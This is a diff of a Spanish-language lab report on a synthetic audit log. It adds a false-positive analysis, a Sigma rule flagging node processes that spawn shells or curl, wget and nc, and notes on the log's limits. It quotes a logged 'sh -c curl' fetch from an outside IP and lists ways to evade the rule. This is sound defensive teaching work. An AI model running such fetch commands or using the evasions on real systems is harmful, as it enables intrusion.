@@ -69,17 +69,92 @@ compromiso para bloquear y buscar en otros logs.
 
 ## 3. Falsos positivos
 
-_¿Qué línea parece sospechosa pero puede ser legítima? ¿Cómo la distinguirías?_
+**db01: `sshd` → `bash` (líneas 8, 13 y 21).** Parece sospechoso porque aparece un
+`bash`, pero es exactamente lo que ocurre cuando un administrador entra por SSH. No se
+puede afirmar nada sin más datos.
+
+**Cómo lo distinguiríamos:**
+
+- Cruzarlo con `auth.log`: usuario, IP de origen y método de autenticación.
+- Verificar si ese horario coincide con una guardia o un cambio planificado.
+- Comprobar si la IP de origen es la habitual de administración.
+
+**Matiz:** hay tres sesiones en siete minutos y la primera (09:42:40) ocurre justo
+después del evento de web01 (09:42:17). La coincidencia de horario no alcanza para
+vincularlas, pero tampoco permite descartarlas. Lo dejamos como **indeterminado**.
+
+**Otro posible falso positivo:** los `node` → `node` y `python` → `python` repetidos
+podrían ser reinicios de los servicios. Conviene confirmar por qué se relanzan.
 
 ---
 
 ## 4. Regla propuesta para Node.js
 
-_Proceso `node` que lanza `sh`, `bash`, `curl` o `wget`. Qué observa, qué condición
-dispara y qué falso negativo podría tener._
+**Qué observa:** eventos de creación de procesos (auditd, Sysmon for Linux o un EDR).
+
+**Condición:** el proceso padre es `node` **y** el proceso hijo es `sh`, `bash`, `dash`,
+`curl`, `wget` o `nc`. **Severidad alta** en hosts de API, que no deberían lanzar shells.
+
+```yaml
+title: Proceso node lanza shell o herramienta de descarga
+logsource:
+  category: process_creation
+  product: linux
+detection:
+  selection:
+    ParentImage|endswith: '/node'
+    Image|endswith:
+      - '/sh'
+      - '/bash'
+      - '/dash'
+      - '/curl'
+      - '/wget'
+      - '/nc'
+  condition: selection
+level: high
+```
+
+**Prueba contra nuestro log** (el log trae nombres de proceso, no rutas completas):
+
+```bash
+grep -E 'ppid_comm=node ' laboratorio/logs/audit.log | grep -E ' comm=(sh|bash|dash|curl|wget|nc) '
+```
+
+Devuelve una sola línea: la 9 (`api01`, 09:43:03, `sh -c curl http://198.51.100.7/x`).
+
+**Falsos positivos:** aplicaciones que usan `child_process.exec()` de forma legítima
+(generar PDFs, llamar a `git`, etc.). Se manejan con una lista de excepciones por host
+o por comando.
+
+**Falsos negativos:**
+
+- Un reverse shell hecho en JavaScript puro, sin crear procesos hijos.
+- Binarios renombrados (por ejemplo `/tmp/x` en lugar de `curl`).
+- Otros intérpretes lanzados desde `node` (`python3`, `perl`).
+- Una regla que mira solo padre → hijo directo no ve a los nietos si el primer hijo
+  no está en la lista.
+- Hosts sin auditoría de procesos: sin telemetría, la regla no se dispara.
+
+**Mejoras posibles:** seguir la cadena completa de procesos (padre → hijo → nieto),
+alertar sobre hijos nunca vistos en ese host, comparar hashes de binarios y combinar
+la regla con alertas de conexiones salientes.
+
+**Sobre la regla SIGMA de CISA:** no está en el repo y no la usamos. La regla de arriba
+es propia. Conceptualmente, la de PHP observa lo mismo con `apache2`, `php-fpm` o
+`httpd` como padre.
 
 ---
 
 ## 5. Limitaciones del log
 
-_Usuario, IP de origen, retención, ruido, ausencia de telemetría, etc._
+- **No hay usuario** que ejecutó cada proceso.
+- **No hay IP de origen** ni el request HTTP que disparó el comando.
+- **No hay resultado:** no sabemos si `curl` o `wget` descargaron algo o fallaron.
+- **No hay conexiones de red.**
+- **Una sola fuente:** no se puede correlacionar con logs de Apache, del proxy o del
+  firewall.
+- **Retención de unos 9 minutos** (09:40 a 09:49): no cubre desde el 17/10, que es la
+  ventana que habría que revisar.
+- **No hay hash del binario:** un binario renombrado pasa desapercibido.
+- **Es un log sintético:** no refleja lo que pasó en nuestros contenedores, y no
+  pudimos cruzarlo con `auth.log` ni con ninguna otra fuente.
